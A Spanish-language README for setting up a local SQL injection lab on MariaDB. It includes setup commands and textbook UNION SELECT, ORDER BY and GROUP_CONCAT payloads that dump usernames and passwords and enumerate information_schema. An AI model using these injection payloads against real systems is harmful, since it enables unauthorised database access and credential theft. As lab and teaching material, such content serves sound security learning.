# 🧪 Laboratorio de Inyección SQL (MySQL/MariaDB)

## Este repositorio contiene los comandos básicos y la configuración necesaria para montar un entorno de pruebas y entender los fundamentos de la extracción de datos mediante SQL Injection.

# 📋 Tablas de Referencia SQL

### Operaciones Estándar de Base de Datos

Esta tabla cubre los comandos esenciales para administrar y consultar datos de forma normal.

| Comando |            Propósito                   |             Ejemplo de uso                |
| --------|:--------------------------------------:| :----------------------------------------:|
| SELECT  | Recuperar o leer datos de una tabla.   | SELECT * FROM users;                      | 
| CREATE  | Crear bases de datos o tablas nuevas.  | "CREATE TABLE logs (id INT, msg TEXT);"   |
| INSERT  | Añadir nuevos registros a una tabla.   | INSERT INTO users (user) VALUES ('pepe'); |
| WHERE   | Filtrar resultados bajo una condición. | SELECT * FROM users WHERE id = 1;         |


## Técnicas Avanzadas y Extracción (Pentesting)

### Estos comandos son los que usamos para manipular la salida y descubrir información oculta.

|   Comando     |              Uso en Pentesting                        |        Ejemplo Táctico                      |
| ------------- | ------------------------------------------------------|---------------------------------------------|
| UNION SELECT  |  Combinar resultados de dos consultas distintas.      | ... UNION SELECT 1,2,3;"                    |
| ORDER BY      |  Enumerar columnas para encontrar el ancho del SELECT | ... ORDER BY 5;                             |  
| GROUP_CONCAT  |  Agrupar múltiples filas en una sola línea de texto.  | SELECT GROUP_CONCAT(username) FROM users;   |

##  1. Configuración del Entorno Linux

### Primero, instalamos los servicios necesarios y los configuramos para que arranquen automáticamente.

### Instalación de paquetes
```bash
sudo apt update && sudo apt install apache2 mariadb-server php libapache2-mod-php php-mysql -y
```
### Gestion de Servicios

# Habilitar para que inicien con el sistema
```bash
sudo systemctl enable apache2
sudo systemctl enable mysql
```
# Arrancar los servicios ahora
```bash
sudo systemctl start apache2
sudo systemctl start mysql
```
##  2. Setup de la Base de Datos

Creación de la base de datos
```sql
CREATE DATABASE laboratorio;
USE laboratorio;
```
Creación de la tabla de usuarios
```sql
CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50),
    password VARCHAR(50)
);
```

Inserción de datos de prueba

```sql
INSERT INTO users (username, password) VALUES 
('admin', 'admin1234'), 
('pepe', 'perez55'), 
('luis', 'luisito_pass');
```
Configuración de usuario limitado para la APP

```sql
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'password123';
GRANT SELECT ON laboratorio.* TO 'app_user'@'localhost';
FLUSH PRIVILEGES;
```

**GRANT ALL PRIVILEGES:** Le das permiso para hacer todo (leer, escribir, borrar, crear).

**ON laboratorio.*:** Esto significa: "En la base de datos llamada laboratorio, y en todas sus tablas (el asterisco *)". El usuario no podrá ver otras bases de datos del sistema, solo la suya.

**FLUSH PRIVILEGES:** Este comando es como darle al botón de "Guardar cambios" o "Refrescar".

> MySQL guarda los permisos en unas tablas internas. A veces, si no ejecutas este comando, MySQL sigue usando la configuración vieja y el usuario nuevo no puede entrar. Con esto, obligas a la base de datos a leer los nuevos permisos de inmediato.

## Con estos comandos puede validar que tu usuario fue creado correctamente

## Trae el usuario recien creado
```sql
SELECT user, host FROM mysql.user;
```
## Valida los permisos
```sql
SHOW GRANTS FOR 'app_user'@'localhost';
```
## Ingresar con el usuario nuevo
```sql 
mysql -u web_user -p
```

🛠️ 3. Comandos Básicos de Consulta

Operaciones Estándar

Ver todo: `SELECT * FROM users; `

Ordenar: ` SELECT * FROM users ORDER BY 2 ASC;` (Organiza por la segunda columna).

Técnicas de Extracción (Pentesting)

Contar columnas: Se usa ORDER BY incrementando el número hasta que dé error. Esto nos permite saber el ancho de la consulta original.

Unión de consultas:

Si el SELECT original pide 3 columnas:
```sql 
SELECT * FROM users WHERE id=1 UNION SELECT username, 2, 3 FROM users;
```

Si el SELECT original pide solo 1 columna:
```sql 
SELECT username FROM users WHERE id=1 UNION SELECT password FROM users;
```

Aspiradora de datos:

Concatena todos los resultados en una sola línea usando ":" como separador (0x3a)
```sql
SELECT GROUP_CONCAT(username, 0x3a, password) FROM users;
```

🔍 4. Fingerprinting y ReconocimientoComandos útiles para obtener información sobre el servidor


| Funcion       |           Descripción            |
| ------------- |:-------------------------------  |
| USER()        | Usuario que ejecuta la consulta. |
| DATABASE()    | Nombre de la DB actual.          |
| VERSION()     | Versión del motor SQL.           |
| @@VERSION     | Variable global de versión.      |


🗺️ 5. Mapeo con information_schema

El "mapa del tesoro" para descubrir tablas y columnas cuando no conocemos sus nombres.

📂 Listar Bases de Datos

```sql
SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata;
```

🗄️ Listar Tablas de la DB actual

```sql
SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = DATABASE();
```

📋 Listar Columnas de una tabla específica

```sql 
SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'users';
```



# Acceso a documentacion MYSQL

Puedes consultar toda la información en la [Pagina MYSQL](https://dev.mysql.com/doc/mysql-tutorial-excerpt/8.0/en/).


⚠️ IMPORTANTE: Este material tiene fines exclusivamente educativos y éticos. Nunca utilices estas técnicas en
sistemas sobre los que no tengas autorización explícita. El mal uso de esta información es responsabilidad del usuario.


